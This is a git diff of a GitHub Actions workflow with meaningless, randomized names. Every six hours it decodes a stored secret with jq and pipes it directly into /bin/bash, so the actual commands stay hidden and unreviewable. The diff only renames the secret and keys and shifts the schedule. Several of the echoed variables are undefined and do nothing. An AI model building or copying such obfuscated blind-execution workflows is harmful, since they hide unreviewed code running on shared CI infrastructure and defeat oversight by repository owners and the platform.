@@ -1,26 +1,22 @@
 name: mingyulu1837
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 4/6 * * *'
+    - cron: '24 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          dk519: ${{ secrets.dk519 }}
+          i29878: ${{ secrets.i29878 }}
         run: |
-          echo $dk519 | jq -r .rnu331 | /bin/bash
-          echo $rhal1 | jq -r .s6832 | /bin/bash
-          echo $wmk972 | jq -r .jc621 | /bin/bash
-          echo $ujzid8667 | jq -r .te67 | /bin/bash
-          echo $g8 | jq -r .qst82 | /bin/bash
-          echo $xmyk0558 | jq -r .ocmav082 | /bin/bash
-          echo $crnq5847 | jq -r .xi80331 | /bin/bash
-          echo $obesg33227 | jq -r .pkidg551 | /bin/bash
-          echo $coqm5886 | jq -r .lrwu6730 | /bin/bash
-          echo $tuy4 | jq -r .q8 | /bin/bash
+          echo $i29878 | jq -r .yba487 | /bin/bash
+          echo $pugk97 | jq -r .z31 | /bin/bash
+          echo $wqmx541 | jq -r .gon2 | /bin/bash
+          echo $q39 | jq -r .mh727 | /bin/bash
 
